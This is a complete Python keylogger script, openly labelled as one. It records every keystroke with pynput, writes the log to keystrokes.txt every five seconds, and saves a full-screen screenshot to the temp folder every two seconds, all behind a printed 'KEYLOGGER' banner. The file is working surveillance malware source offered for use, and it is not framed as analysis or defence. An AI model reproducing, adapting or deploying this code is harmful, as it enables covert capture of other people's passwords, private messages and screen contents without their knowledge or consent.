#!/usr/bin/env python
import threading
import pynput.keyboard
import pyautogui
import time
import tempfile
import subprocess
import os
from colorama import init, Fore		# for fancy/colorful display

class Keylogger:

    def __init__(self, interval):
        self.log = ""
        self.interval = interval
        self.temp_dir = tempfile.gettempdir()
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.RESET = Fore.RESET

    def append_to_log(self, string):
        self.log = self.log + " " + string
    
    def process_key(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " _ "
            elif key == key.backspace:
                current_key = " <-- "
            else:
                current_key = "_" + str(key)
        self.append_to_log(current_key)

        # print(self.log)

    def report(self):       # Thread - 1
        with open('keystrokes.txt', 'a') as f:
            f.write('\n')
            f.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def screenshot(self):       # Thread - 2
        x = 1
        while True:
            pyautogui.screenshot(self.temp_dir + '/image-' + str(x) + '.png')
            x += 1
            time.sleep(2)   # Take screenshot after every 3 seconds
            print('\n{}[+] Screenshot Captured !{}'.format(self.Yellow, self.RESET))
        timer = threading.Timer(self.interval, self.screenshot)
        timer.start()
        
    def start(self):
        if 'nt' in os.name:
            subprocess.call('cls', shell=True)
        else:
            subprocess.call('clear', shell=True)

        print('{}\n\n\t\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
        print('\n{}\t\t\t\t\t\t#\t\t      K E Y L O G G E R \t\t#\n{}'.format(self.Cyan, self.RESET))
        print('{}\t\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

        print('\n\n{}[+] Start Capturing Keystrokes ...{}\n'.format(self.GREEN, self.RESET))
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key)
        with keyboard_listener:
            self.report()
            self.screenshot()
            keyboard_listener.join()


if __name__ == '__main__':
    obj = Keylogger(5)
    obj.start()






